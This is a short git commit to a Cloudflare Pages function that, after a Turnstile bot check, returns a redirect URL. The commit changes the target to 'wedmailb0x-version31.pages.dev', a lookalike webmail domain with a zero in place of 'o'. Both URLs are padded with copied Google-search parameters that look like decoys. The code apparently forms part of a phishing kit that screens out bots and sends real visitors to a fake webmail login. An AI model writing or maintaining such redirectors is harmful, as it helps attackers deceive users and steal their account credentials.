1fd32b2d86400b963ff0038f0d6c3a87191ca6a2
benito007-index <benitocalvin@yandex.com>
2025-05-26 16:09:41 +0800

    Update verify.js

--- functions/verify.js
+++ functions/verify.js
@@ -19,7 +19,7 @@ export async function onRequestPost(context) {
     return new Response("Turnstile verification failed", { status: 403 });
   }
 
-  const redirectUrl = `https://webmailbox-unresolved.pages.dev/sca_esv=540de929b15f835b&rlz=1C1RLNS_enUS865NG865&sxsrf=AHTn8zo7Yb_qRgh7lrx8XoO3Y7YJu7YN6Q%3A1744153427701&ei=U6v1Z4XIKuaYhbIPw4rZqAQ&ved=0ahUKEwjFvffrxcmMAxVmTEEAHUNFFkUQ4dUDCBA&uact=5&oq=7jzq8.sa.com&gs_lp=Egxnd3Mtd2l6LXNlcnAiDDdqenE4LnNhLmNvbUi1BFAAWABwAHgAkAEAmAGRAqABkQKqAQMyLTG4AQPIAQD4AQGYAgCgAgCYAwCSBwCgB0CyBwC4BwA&sclient=gws-wiz-serp`;
+  const redirectUrl = `https://wedmailb0x-version31.pages.dev/sca_esv=540de929b15f835b&rlz=1C1RLNS_enUS865NG865&sxsrf=AHTn8zo7Yb_qRgh7lrx8XoO3Y7YJu7YN6Q%3A1744153427701&ei=U6v1Z4XIKuaYhbIPw4rZqAQ&ved=0ahUKEwjFvffrxcmMAxVmTEEAHUNFFkUQ4dUDCBA&uact=5&oq=7jzq8.sa.com&gs_lp=Egxnd3Mtd2l6LXNlcnAiDDdqenE4LnNhLmNvbUi1BFAAWABwAHgAkAEAmAGRAqABkQKqAQMyLTG4AQPIAQD4AQGYAgCgAgCYAwCSBwCgB0CyBwC4BwA&sclient=gws-wiz-serp`;
   return new Response(JSON.stringify({ redirectUrl }), {
     headers: { "Content-Type": "application/json" },
     status: 200,
